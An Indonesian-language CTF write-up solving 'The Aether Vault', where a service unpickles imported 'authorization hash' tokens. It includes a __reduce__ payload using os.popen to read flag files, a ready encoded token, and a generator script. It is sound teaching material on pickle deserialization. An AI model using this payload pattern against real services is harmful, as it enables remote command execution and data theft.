````markdown id="g8m1dv"
# Writeup CTF - The Aether Vault

## Informasi Challenge

- **Judul:** The Aether Vault
- **Kategori:** Misc

---

# Ringkasan

Challenge menyediakan sebuah service berbasis menu yang memungkinkan pengguna melakukan otorisasi terhadap research log, mengekspor authorization hash, serta mengimpor authorization hash.

Sekilas fitur **Export Authorization Hash** tampak seperti menghasilkan hash kriptografis. Namun, petunjuk challenge mengarah pada fakta bahwa data tersebut sebenarnya merupakan **objek Python yang diserialisasi menggunakan pickle**, kemudian dibungkus dengan **Base64** dan **ROT13**.

Karena service melakukan proses **`pickle.loads()`** terhadap data yang diimpor tanpa validasi, challenge ini dapat dieksploitasi menggunakan **Python Pickle Deserialization** untuk mengeksekusi perintah pada server dan memperoleh flag.

---

# Petunjuk Challenge

Hint yang diberikan:

```text
Project C1 was always a bit... sour.
I heard the lead scientist likes to keep his data
preserved in a base solution,
rotated 13 times for "security".
```

Makna dari petunjuk tersebut adalah:

```text
preserved      → Pickle

base solution  → Base64

rotated 13     → ROT13

Project C1     → Petunjuk tambahan menuju log "Pickled"
```

Dengan demikian format authorization hash dapat disimpulkan sebagai:

```text
ROT13(Base64(Pickle_Object))
```

---

# Interaksi Awal

Menu service:

```text
=== Aether Research Vault v4.0.7 ===

1. Authorize log access
2. View authorized logs
3. Export authorization hash
4. Import authorization hash
```

Ketika belum ada log yang diotorisasi, menu export menghasilkan:

```text
Export Hash (Encrypted):

tNEqyP4=
```

Setelah mengotorisasi salah satu log, token berubah menjadi string yang jauh lebih panjang.

Sebagai contoh:

```text
1
5
```

Output:

```text
Access authorized.
```

Kemudian:

```text
2
```

Menghasilkan:

```text
----------------------------------------
Authorized Research Logs:

5. Project-C1:
The Preservation Protocol (Pickled)

----------------------------------------
```

Judul log tersebut semakin menguatkan bahwa challenge berkaitan dengan **Python Pickle**.

---

# Analisis Encoding

Authorization hash ternyata bukan hash satu arah, melainkan hasil beberapa proses encoding yang bersifat reversible.

Urutan prosesnya adalah:

```text
Python Object

↓

pickle.dumps()

↓

Base64

↓

ROT13
```

Sehingga proses decode dilakukan sebagai berikut:

```python
import base64
import codecs
import pickle

enc = "..."

b64 = codecs.decode(enc, "rot_13")
raw = base64.b64decode(b64)

obj = pickle.loads(raw)
```

Keberadaan `pickle.loads()` pada proses import menjadi titik utama kerentanan.

---

# Analisis Kerentanan

Python Pickle tidak dirancang untuk menerima data dari sumber yang tidak dipercaya.

Saat `pickle.loads()` memproses objek tertentu, Python dapat memanggil method khusus seperti:

```python
__reduce__()
```

Method tersebut dapat mengembalikan sebuah callable beserta argumennya sehingga fungsi tersebut akan dipanggil secara otomatis selama proses deserialisasi.

Dengan memanfaatkan perilaku ini, penyerang dapat membuat pickle yang mengeksekusi perintah sistem ketika di-import.

---

# Penyusunan Payload

Payload dibuat menggunakan sebuah objek dengan implementasi `__reduce__()`.

```python
import os

class RCE:
    def __reduce__(self):
        cmd = (
            "find / -maxdepth 3 "
            "-type f -iname '*flag*' "
            "-exec cat {} \\; 2>/dev/null"
        )

        return (os.popen, (cmd,))
```

Objek tersebut kemudian:

1. Diserialisasi menggunakan `pickle.dumps()`
2. Di-encode menggunakan Base64
3. Ditransformasi menggunakan ROT13

Sehingga menghasilkan authorization hash yang valid.

---

# Payload yang Berhasil

Token yang berhasil digunakan:

```text
tNFIutNNNNNNNNPZPTW1nJk0nJ5myVjRMKMuoWFGyVkdJ19snJ1jo3W0K18bVz9mVvxhpT9jMJ4bVzMcozDtYlNgoJS4MTIjqTttZlNgqUyjMFOzVP1cozSgMFNaXzMfLJpdWlNgMKuyLlOwLKDtr30tKSj7VQV+Y2Eyqv9hqJkfVvxhpzIuMPtcKMFSySXHYt==
```

Langkah eksploitasi:

```text
4
```

Masukkan payload di atas.

Kemudian pilih:

```text
2
```

Output:

```text
Import successful.

----------------------------------------
Authorized Research Logs:

KaliTeam{p1ckl3_4nd_r0t13_4r3_n0t_s4f3_4nym0r3}

----------------------------------------
```

---

# Generator Payload

Script berikut dapat digunakan untuk menghasilkan payload serupa.

```python
#!/usr/bin/env python3

import base64
import codecs
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = (
            "find / -maxdepth 3 "
            "-type f -iname '*flag*' "
            "-exec cat {} \\; 2>/dev/null"
        )

        return (os.popen, (cmd,))


def main():
    raw = pickle.dumps(RCE())

    b64 = base64.b64encode(raw).decode()

    token = codecs.encode(
        b64,
        "rot_13"
    )

    print(token)


if __name__ == "__main__":
    main()
```

Token yang dihasilkan kemudian diimpor melalui menu:

```text
4. Import authorization hash
```

Setelah import berhasil, pilih:

```text
2. View authorized logs
```

untuk memperoleh flag.

---

# Flag

```text
KaliTeam{p1ckl3_4nd_r0t13_4r3_n0t_s4f3_4nym0r3}
```

---

